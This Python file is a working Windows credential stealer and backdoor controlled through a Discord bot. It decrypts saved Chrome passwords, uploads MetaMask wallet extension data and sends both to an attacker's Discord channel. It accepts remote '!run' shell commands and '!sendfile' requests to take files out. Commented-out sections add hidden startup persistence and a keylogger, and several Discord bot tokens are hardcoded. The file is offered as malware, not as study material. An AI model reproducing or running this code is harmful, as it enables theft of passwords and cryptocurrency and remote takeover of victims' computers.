import os
import json
import base64
import sqlite3
from Cryptodome.Cipher import AES
import shutil
from datetime import datetime, timedelta
import uuid
import discord
from discord.ext import commands
import subprocess
import win32crypt

bot_token = 'MTE1OTA0MTYyMDg4NTM4NTI0Ng.G7kdSe.TJO0BEq44uM0ggKL5vVaf346ObdrCTIb341TiE'
server_id = "1159042334500069386"

#ppp
# bot_token = 'MTE3NjkyNzUxNjc0NTgwMTkyMQ.GvdE2u.hoa-GlhO-ExB_pmpJDf6_EXXjCNpAUQfefrRIs'
# server_id = "1176927599436497008"

#leo
# bot_token = 'MTE3NjE4MjE4OTI2NDc0MDQ3NA.G77X4U.WWXKu8PyniO2lZ9HGT89S16ZR5LmFhJoEa_NrM'
# server_id = "1176182379644203103"

#tello
# bot_token = 'MTE3NjE2NDMzMTUwNzk0NTUyMg.GzlNQH.zd1Iag7KIw4QSflqNnTtC0Gx9ky1nmuIr2nwEQ'
# server_id ='1176164942907457586'

#hans
# bot_token = 'MTE3NjE3MzEzNzIwNTkzNjE0OA.G6IFtx.9qiQZ7KSL3F-5IyzH3mbUN767uR0lS8c0cv-eo'
# server_id ='1176173365069893632'

#k
# bot_token = 'MTE3NDY0NTE1NTcwMjI0MzM0MA.G-y_cq.YyH6WXosDzgTeORrUO1i7UCf1UGSxCs0v32TYs'
# server_id ='1174645965525884939'

intents = discord.Intents.default()
intents.message_content = True
intents.presences = True
intents.members = True

client = discord.Client(intents=intents)

windowTitle = ''
temp = ''

device_id = uuid.getnode()
logfilepath = f"{os.path.expanduser('~')}\\AppData\\Local\\log.txt"

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    # local_state_path = "Local_State"
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    print(key)
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

async def getPwd(channel, db_path):
    if os.path.exists(db_path):
        tempfilepath = f"{os.path.expanduser('~')}\\AppData\\Local\\Google\\Chrome\\ChromeData.db"
        key = get_encryption_key()
        shutil.copyfile(db_path, tempfilepath)
        db = sqlite3.connect(tempfilepath)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            temp = ''
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                if date_created != 86400000000 and date_created:
                    temp += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
                if date_last_used != 86400000000 and date_last_used:
                    temp += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
                temp += "="*50 + '\n'
                temp += f"Origin URL: {origin_url}\n"
                temp += f"Action URL: {action_url}\n"
                temp += f"Username: {username}\n"
                temp += f"Password: {password}\n"
                await channel.send(temp)
            else:
                continue
        cursor.close()
        db.close()
        try:
            os.remove(tempfilepath)
        except:
            pass

# def addStartup():
#     shutil.copyfile(os.getcwd() + "\\apis.py", os.path.expanduser('~') + "\\AppData\\Local\\good.py")
#     shutil.copytree(os.getcwd() + "\\database", os.path.expanduser('~') + "\\AppData\\Local\\database")
#     shutil.copyfile(os.getcwd() + "\\mock.dat", os.path.expanduser('~') + "\\AppData\\Local\\requirements.txt")
#     subprocess.CREATE_NO_WINDOW = 0x08000000
#     os.chdir(os.path.expanduser('~') + "\\AppData\\Local")
#     subprocess.Popen("pip install -r requirement.txt", creationflags=subprocess.CREATE_NO_WINDOW)
#     startup = "C:\\ProgramData\\Microsoft\\Windows\\python_runner.bat"
#     with open(os.path.expanduser('~') + "\\AppData\\Local\\run.py", 'w') as file:
#         file.write(f"import subprocess\nsubprocess.CREATE_NO_WINDOW = 0x08000000\nprocess = subprocess.Popen(\"python good.py\", creationflags=subprocess.CREATE_NO_WINDOW)")
#     with open(startup, 'w') as file:
#         file.write(f"@echo off\npython {os.path.expanduser('~')}\\AppData\\Local\\run.py")
#     key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
#     reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
#     with reg_key:
#         winreg.SetValueEx(reg_key, 'python', 0, winreg.REG_SZ, startup)

# def keylogger(event):
#     global windowTitle, temp
#     key = event.name
#     if event.name  == "space":
#         key = ' [space] '
#     if event.name == 'enter' :
#         key = " [enter]\n"
#     if event.name == 'v' and keyboard.is_pressed('ctrl'):
#         key = "[ctrl + v]" + pyperclip.paste()
#     if windowTitle == gw.getActiveWindow().title and event.name != 'enter' :
#         temp = temp + str(key)
#     else :
#         tempMsg = windowTitle + " : " + temp + '\n'
#         with open(logfilepath, 'a', encoding='utf-8') as file:
#             file.write(str(tempMsg))
#         temp = '' + str(key) 
#         windowTitle = gw.getActiveWindow().title

def start():
    dirpath = f"{os.path.expanduser('~')}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    ldb_files = []
    for i in range(1000) :
        profile_dir = f"{os.path.expanduser('~')}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile {i}\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
        if os.path.exists(profile_dir):
            for file in os.listdir(profile_dir):
                if file.endswith('.ldb'):
                    if os.path.exists(os.path.join(profile_dir, file)):
                        ldb_files.append(os.path.join(profile_dir, file))
    if os.path.exists(dirpath):
        for file in os.listdir(dirpath):
            if file.endswith('.ldb'):
                ldb_files.append(file)

    bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        print(f'Bot connected as {bot.user}')
        server = bot.get_guild(int(server_id))
        global channel
        channel = discord.utils.get(server.channels, name = "windows" + str(device_id))
        default_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
        # default_db_path = "./Login_Data"
        if channel:
            await channel.send('This is an existing channel.')
        else:
            category = discord.utils.get(server.categories, name='Category Name')  
            channel = await server.create_text_channel("windows" + str(device_id), category=category)
            for ldb_file in ldb_files:
                if os.path.isfile(ldb_file):
                    with open(ldb_file, 'rb') as file:
                        await channel.send(file=discord.File(file))
            await channel.send('This is a newly created channel.')
            await getPwd(channel, default_db_path)
            for i in range(20):
                profile_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Profile " + str(i), "Login Data")
                print(profile_db_path)
                if os.path.exists(profile_db_path):
                    await getPwd(channel, profile_db_path)
            # addStartup()
        # keyboard.on_press(keylogger)

    @bot.command("send")
    async def send(ctx):
        if channel.name == "windows" + str(device_id):
            with open(logfilepath, 'rb') as file:
                await channel.send(file=discord.File(file))
            await os.remove(logfilepath)
            
    @bot.command("sendfile")
    async def sendfile(ctx, *, filename):
        print(channel.name, "windows" + str(device_id), filename)
        if channel.name == "windows" + str(device_id):
            if os.path.isfile(filename):
                await channel.send(file=discord.File(filename))
            else:
                await channel.send("File not found!")

    @bot.command("run")
    async def run(ctx, *, command):
        if channel.name == "windows" + str(device_id):
            if command == 'cd..':
                os.chdir('..')
            elif command.startswith("folder_"):
                folder = command[7:]
                os.chdir(folder)
            elif command.startswith("drive_"):
                drive = command[6:]
                os.chdir(drive + ":")
            else:
                result = subprocess.run([command], shell=True, stdout=subprocess.PIPE)
                output = result.stdout.decode('utf-8')
                if output:
                    if len(output) > 2000:
                        output_chunks = [output[i:i+2000] for i in range(0, len(output), 2000)]
                        for chunk in output_chunks:
                            await channel.send(chunk)
                    else:
                        await channel.send(output)

    bot.run(bot_token)

start()
# get_encryption_key()